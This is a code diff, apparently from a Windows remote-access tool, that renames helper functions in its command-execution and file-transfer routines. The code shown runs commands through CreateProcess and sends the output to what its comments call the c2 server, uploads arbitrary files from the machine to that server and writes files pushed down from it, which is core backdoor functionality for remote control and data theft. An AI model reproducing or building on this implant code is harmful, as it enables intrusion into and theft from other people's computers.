@@ -97,7 +97,7 @@ int exec_cmd(const SOCKET connect_socket, char* const buf)
 	|| (!SetHandleInformation(child_stdout_read, HANDLE_FLAG_INHERIT, 0))
 
 	// Execute command via CreateProcess.
-	|| (!sakito_win_cp(child_stdout_write, buf)))
+	|| (!s_win_cp(child_stdout_write, buf)))
 		return FAILURE;
 
 	// Send read bytes from pipe (stdout, stderr) to the c2 server.
@@ -133,14 +133,14 @@ int send_file(const SOCKET connect_socket, char* const buf)
 	uint64_t f_size = FAILURE;
 
 	// Open file with read permissions.
-	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);
+	HANDLE h_file = s_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);
 
 	// If File Exists.
 	if (h_file != INVALID_HANDLE_VALUE) 
-		f_size = sakito_win_fsize(h_file);
+		f_size = s_win_fsize(h_file);
 
 	// Send read file bytes to server.
-	if (sakito_win_sendf(connect_socket, h_file, buf, f_size) < 1)
+	if (s_win_sendf(connect_socket, h_file, buf, f_size) < 1)
 		return SOCKET_ERROR;
 
 	// Receive file transfer finished byte.
@@ -157,7 +157,7 @@ int send_file(const SOCKET connect_socket, char* const buf)
 int recv_file(const SOCKET connect_socket, char* const buf) 
 {
 	// Open file.
-	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);
+	HANDLE h_file = s_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);
 
 	// Send file transfer start byte.
 	if (send(connect_socket, FTRANSFER_START, 1, 0) < 1)
@@ -168,7 +168,7 @@ int recv_file(const SOCKET connect_socket, char* const buf)
 		return SOCKET_ERROR;
 
 	// Deserialize f_size.
-	uint64_t f_size = ntohll_conv(buf);
+	uint64_t f_size = s_ntohll_conv(buf);
 
 	// Initialize i_result to true/1.
 	int i_result = SUCCESS;
@@ -176,7 +176,7 @@ int recv_file(const SOCKET connect_socket, char* const buf)
 	// If file exists.
 	if (f_size > 0)
 		// Windows TCP file transfer (recv) function located in sakito_swin_tools.h.
-		i_result = sakito_win_recvf(connect_socket, h_file, buf, f_size);
+		i_result = s_win_recvf(connect_socket, h_file, buf, f_size);
 
 	// Close the file.
 	CloseHandle(h_file);
